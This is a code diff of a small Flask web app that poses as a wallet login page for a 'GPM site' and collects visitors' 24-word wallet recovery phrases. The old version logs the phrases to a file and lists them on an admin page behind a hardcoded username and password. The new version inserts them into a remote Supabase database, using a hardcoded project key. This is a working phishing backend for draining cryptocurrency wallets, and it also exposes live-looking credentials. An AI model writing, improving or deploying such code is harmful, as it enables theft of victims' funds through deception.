@@ -1,31 +1,13 @@
-from flask import Flask, render_template, request, Response
-from functools import wraps
+from flask import Flask, render_template, request
+from supabase import create_client
 
 app = Flask(__name__)
 
-# --------------------------
-# Authentication for /admin
-# --------------------------
-def check_auth(username, password):
-    return username == 'kheed67' and password == 'Teenie67*'  # change as needed
+# Supabase setup
+SUPABASE_URL = 'https://ixqiadgvovxozexatyta.supabase.co'
+SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Iml4cWlhZGd2b3Z4b3pleGF0eXRhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDgxNjk5ODcsImV4cCI6MjA2Mzc0NTk4N30.yXPGI9RR_H4N9Ocp4FQGgh4ycDFRz9cfUEkX_PdTJos'
 
-def authenticate():
-    return Response(
-        'Access denied. Please log in.', 401,
-        {'WWW-Authenticate': 'Basic realm="Login Required"'})
-
-def requires_auth(f):
-    @wraps(f)
-    def decorated(*args, **kwargs):
-        auth = request.authorization
-        if not auth or not check_auth(auth.username, auth.password):
-            return authenticate()
-        return f(*args, **kwargs)
-    return decorated
-
-# --------------------------
-# Routes
-# --------------------------
+supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
 
 @app.route('/')
 def home():
@@ -37,24 +19,10 @@ def passphrase():
 
 @app.route('/submit-passphrase', methods=['POST'])
 def submit_passphrase():
-    phrase = request.form.get('passphrase', '').strip()
-    words = phrase.split()
-    if len(words) != 24:
-        return render_template('passphrase.html', error="Invalid passphrase, please enter exactly 24 words of your wallet to login to GPM site")
+    phrase = request.form.get('passphrase')
+    if phrase:
+        supabase.table('passphrases').insert({'phrase': phrase}).execute()
+    return "Passphrase submitted successfully"
 
-    with open('passphrases.txt', 'a') as file:
-        file.write(phrase + '\n')
-    return "Wallet unlocked. Redirecting to GPM site..."
-
-@app.route('/admin')
-@requires_auth
-def admin():
-    with open('passphrases.txt', 'r') as file:
-        passphrases = file.readlines()
-    return '<br>'.join(passphrases)
-
-# --------------------------
-# Run the App
-# --------------------------
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5054)
+    app.run(host='0.0.0.0', port=5005)
